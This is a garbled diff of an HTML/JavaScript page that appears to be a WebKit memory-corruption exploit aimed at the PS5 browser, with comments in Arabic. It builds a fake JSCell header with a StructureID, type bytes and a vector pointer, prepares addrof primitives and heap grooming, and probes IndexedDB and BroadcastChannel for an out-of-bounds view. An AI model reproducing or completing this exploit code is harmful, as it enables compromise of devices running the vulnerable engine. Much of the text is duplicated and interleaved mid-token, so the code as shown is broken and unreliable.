+eded=()=>rq.result.createObjectStore('kv');
+      rq.onsuccess=()=>{ const db=rq.result;
+        try{ db.transaction('kv','readwrite').objectStore('kv').put(view,'k'); res(true);}catch(e){res  try{ const(false);} };
+      rq.onerror= bc=new BroadcastChannel('rw()=>res(false);
+    });
+    paths.push([''); bcindexedDB',ok]);
+  }catch(e){paths.push(['indexedDB','ERR']);}
+  // PATH D: BroadcastChannel
+  try{ const bc=new BroadcastChannel('rw.postMessage({v:view}); bc.close(); paths.push(['broadcast',true]); }catch(e){paths.push(['broadcast','ERR']);}
+  return paths;
+}
+
+/* ===== PHASE '); bc.postMessage({v:view}); bc.close(); paths.push(['broadcast',true]); }catch(e){paths.push(['broadcast','ERR']);}
+  return paths;
+}
+
+/* ===== PHASE 6: FAKE HEADER CORRUPTION TEMPLATE ===== */
+function fakeHeaderTemplate(targetVector){
+  // JSCell: [StructureID:4][indexingType:1][type:1][cellState:1][flags:1]
+  // ثم butterfly/vector pointers حسب البنية
+  const sid=0xfc10, mode=0x58, len=0x100;
+  const hdr=new Uint8Array(0x36: FAKE HEADER CORRUPTION TEMPLATE ===== */
+function fakeHeaderTemplate(targetVector){
+  // JSCell: [StructureID:4][indexingType:1][type:1][cellState:1][flags:1]
+  // ثم butterfly/vector pointers حسب البنية
+  const sid=0xfc10, mode=0x58, len=0x100;
+  const hdr=new Uint8Array(0x30);
+ 0);
+  hdr[0]= hdr[0]=sid&0xffsid&0xff; hdr[1]=(sid>>8; hdr[1]=(sid>>8)&0xff;           )&0xff;            // StructureID
+  hdr // StructureID
+  hdr[4]=mode;                                       // indexingType
+  hdr[5]=0x28;                                       // JSType (typed array range[4]=mode;                                       // indexingType
+  hdr[5]=0x28;                                       // JSType (typed array range)
+  // vector pointer little-endian في +0x10 (حسب بنية WebKit-1200)
+  let v=targetVector; 
+  for(let i=0;i<8;i++){ hdr[0x10+i]=Number(v&0xffn); v>>=8n; }
+  // length في +0x18
+  hdr[0x18]=len&0xff;
+  return hdr;
+}
+
+/* ===== MAIN ===== */
+async function run(){
+  L.length)
+  // vector pointer little-endian في +0x10 (حسب بنية WebKit-1200)
+  let v=targetVector; 
+  for(let i=0;i<8;i++){ hdr[0x10+i]=Number(v&0xffn); v>>=8n; }
+  // length في +0x18
+  hdr[0x18]=len&0xff;
+  return hdr;
+}
+
+/* ===== MAIN ===== */
+async function run(){
+  L.length=0;
+=0;
+  log(`  log(`0-rw-0-rw-BOOT-rev=gBOOT-rev=genuine-u8-renuine-u8-rw-w-3-replica-k3-replica-k=2-n==2-n=512-at512-attempt=1-maxtempt=1-max=10`);
+
+  const=10`);
+
+  const {buf,host,writer}=ssvBuild(512);
+  addrofPrep();
+  await sleep(3000); // ADDROF-WRAPPER-READY-wait=3000ms
+  log(`8-rw-ADDROF-WRAPPER-READY-wait= {buf,host,writer}=ssvBuild(512);
+  addrofPrep();
+  await sleep(3000); // ADDROF-WRAPPER-READY-wait=3000ms
+  log(`8-rw-ADDROF-WRAPPER-READY-wait=30003000ms`);
+
+ms`);
+
+  const victim=new Uint8Array(0x20);
+  for(let i=0;i<victim.length;i++) victim  const victim=new Uint8Array(0x20);
+  for(let i=0;i<victim.length;i++) victim[i]=0xa[i]=0xa5;
+
+5;
+
+  const pred  const pred=groomPredecess=groomPredecessor();
+
+ or();
+
+  // جر // جرّب مسّب مسارات الـ storeارات الـ store المتاحة على المتاحة على PS5
+  PS5
+  const results const results=await tryStore=await tryStorePaths(writer, victimPaths(writer, victim);
+  results);
+  results.forEach(([.forEach(([name,okname,ok])=>log])=>log(`9(`9-rw--rw-STORE-<LaTex>id_2</LaTex>{name}name}=<LaTex>id_3</LaTex>{ok}`));
+
+  //));
+
+  // فحص فحص: هل ر: هل رجع أيجع أي path path بـ length ف بـ length فاسد؟
+اسد؟
+  //  // (ه (هنا نحتاجنا نحتاج قراءة قراءة ال الـ storedـ stored view وم view ومقارنةقارنة length)
+  length)
+  log(`10 log(`10-rw-TEMPLATE-rw-TEMPLATE-FAKE-HEADER=<LaTex>id_4</LaTex>{[...fakeHeaderTemplate path رجع view(BigInt(0x10013eb00 بطول0))].slice(0,24).map(b=>b.toString(16).padStart(2,'0')).join('')}`);
+
+  log(`11-rw-NOTE: إذا أي STORE path رجع view بطول ≠ ≠ 5 512 → الن12 → النافذة مفتافذة مفتوحة`);
+وحة`);
+  log(`1  log(`12-rw-N2-rw-NOTE: عنOTE: عندها ندها نكتب fakeHeaderكتب fakeHeader فوق فوق الج الجارار عبر الـ O عبر الـ OOB view`);OB view`);
+  log(`
+  log(`DONE`);
+DONE`);
+}
+</script}
 </script>
 </body>
-</html>
+</body></html>
+></html>
